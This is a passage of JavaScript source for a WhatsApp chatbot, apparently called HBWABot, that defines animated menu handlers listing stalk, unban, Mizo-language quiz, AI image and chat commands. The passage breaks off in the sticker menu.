      image: fs.readFileSync("./asset/image/HBWABot.png"),
      caption: '《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'
    }, {quoted: m})
for (let i = 0; i < HBLoadingmenu.length; i++) {
await HBWABotMz.relayMessage(m.chat, {
        protocolMessage: {
          key,
          type: 14,
          editedMessage: {
           imageMessage: { caption: HBLoadingmenu[i] }
          }
        }
      }, {})
 }
}
break 
case 'stalkermenu': {
 
const balance = await eco.balance(limitneihtu, kancoins)
HBWABotMz.sendMessage(from, { react: { text: "🤖️" , key: m.key }})
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《███████████▒▒▒▒》80%`,
`《███████████████》100%`,
`╭══════════════
┃ *Stalk Menu*
┃ *⛃ Coins :* ${balance.wallet}
┃ *♕  VIP :* ${aActiveEm}
╰══════════════
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
*╭═══❏ Stalker ❏*
┃𒆜┌───┈
┃𒆜│${prefix}igstalk 
┃𒆜│${prefix}mlstalk 
┃𒆜└───────────┈ 
╰══════════════𖡛`]
const { key } = await HBWABotMz.sendMessage(m.chat, {
      image: fs.readFileSync("./asset/image/HBWABot.png"),
      caption: '《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'
    }, {quoted: m})
for (let i = 0; i < HBLoadingmenu.length; i++) {
await HBWABotMz.relayMessage(m.chat, {
        protocolMessage: {
          key,
          type: 14,
          editedMessage: {
           imageMessage: { caption: HBLoadingmenu[i] }
          }
        }
      }, {})
 }
}
break
case 'unbanmenux': {
 
const balance = await eco.balance(limitneihtu, kancoins)
HBWABotMz.sendMessage(from, { react: { text: "🤖️" , key: m.key }})
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《███████████▒▒▒▒》80%`,
`《███████████████》100%`,
`╭══════════════
┃ *Unbanned Menu*
┃ *⛃ Coins :* ${balance.wallet}
┃ *♕  VIP :* ${aActiveEm}
╰══════════════
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
*╭═══❏ Unbanned Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}unbanv1 
┃𒆜│${prefix}unbanv2
┃𒆜│${prefix}unbanv3
┃𒆜│${prefix}unbanv4
┃𒆜│${prefix}unbanv5
┃𒆜└───────────┈ 
╰══════════════𖡛`]
const { key } = await HBWABotMz.sendMessage(m.chat, {
      image: fs.readFileSync("./asset/image/HBWABot.png"),
      caption: '《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'
    }, {quoted: m})
for (let i = 0; i < HBLoadingmenu.length; i++) {
await HBWABotMz.relayMessage(m.chat, {
        protocolMessage: {
          key,
          type: 14,
          editedMessage: {
           imageMessage: { caption: HBLoadingmenu[i] }
          }
        }
      }, {})
 }
}
break
case 'mizomenu': {
 
const balance = await eco.balance(limitneihtu, kancoins)
HBWABotMz.sendMessage(from, { react: { text: "🤖️" , key: m.key }})
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《███████████▒▒▒▒》80%`,
`《███████████████》100%`,
`╭══════════════
┃ *Mizo Tawng*
┃ *⛃ Coins :* ${balance.wallet}
┃ *♕  VIP :* ${aActiveEm}
╰══════════════
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
*╭═══❏ Mizo Tawng ❏*
┃𒆜┌───┈
┃𒆜│${prefix}mizoquiz
┃𒆜│${prefix}picquiz
┃𒆜│${prefix}mbq
┃𒆜│${prefix}biblequiz
┃𒆜│${prefix}lyrics
┃𒆜│${prefix}khb
┃𒆜│${prefix}mzly
┃𒆜│${prefix}cfhb
┃𒆜│${prefix}cfhb2
┃𒆜│${prefix}bible-quotes
┃𒆜│${prefix}bq
┃𒆜│${prefix}mlstalk
┃𒆜│${prefix}igstalk
┃𒆜│${prefix}truth
┃𒆜│${prefix}dare
┃𒆜│${prefix}checkme
┃𒆜│${prefix}check
┃𒆜└───────────┈ 
╰══════════════𖡛`]
const { key } = await HBWABotMz.sendMessage(m.chat, {
      image: fs.readFileSync("./asset/image/HBWABot.png"),
      caption: '《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'
    }, {quoted: m})
for (let i = 0; i < HBLoadingmenu.length; i++) {
await HBWABotMz.relayMessage(m.chat, {
        protocolMessage: {
          key,
          type: 14,
          editedMessage: {
           imageMessage: { caption: HBLoadingmenu[i] }
          }
        }
      }, {})
 }
}
break
case 'aimenu': {
 
const balance = await eco.balance(limitneihtu, kancoins)
HBWABotMz.sendMessage(from, { react: { text: "🤖️" , key: m.key }})
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《███████████▒▒▒▒》80%`,
`《███████████████》100%`,
`╭══════════════
┃ *Ai Menu*
┃ *⛃ Coins :* ${balance.wallet}
┃ *♕  VIP :* ${aActiveEm}
╰══════════════
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
*╭═══❏ AI Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}removebg
┃𒆜│${prefix}ghibli
┃𒆜│${prefix}remini
┃𒆜│${prefix}toanime
┃𒆜│${prefix}tozombie
┃𒆜│${prefix}shazam
┃𒆜│${prefix}shazam2
┃𒆜│${prefix}shazam3
┃𒆜│${prefix}openai [Mizo Language]
┃𒆜│${prefix}gpt [English Language]
┃𒆜│${prefix}ai [Mizo Language]
┃𒆜│${prefix}ai2 [English Language]
┃𒆜│${prefix}gai [Mizo Language]
┃𒆜│${prefix}deepseek
┃𒆜│${prefix}deepai
┃𒆜└───────────┈ 
╰══════════════𖡛`]
const { key } = await HBWABotMz.sendMessage(m.chat, {
      image: fs.readFileSync("./asset/image/HBWABot.png"),
      caption: '《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'
    }, {quoted: m})
for (let i = 0; i < HBLoadingmenu.length; i++) {
await HBWABotMz.relayMessage(m.chat, {
        protocolMessage: {
          key,
          type: 14,
          editedMessage: {
           imageMessage: { caption: HBLoadingmenu[i] }
          }
        }
      }, {})
 }
}
break

case 'stickermenu': {
const balance = await eco.balance(limitneihtu, kancoins)
HBWABotMz.sendMessage(from, { react: { text: "🤖️" , key: m.key }})
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《███████████▒▒▒▒》80%`,
`《███████████████》100%`,
`╭══════════════
┃ *Sticker Menu*
┃ *⛃ Coins :* ${balance.wallet}
┃ *♕  VIP :* ${aActiveEm}
╰══════════════
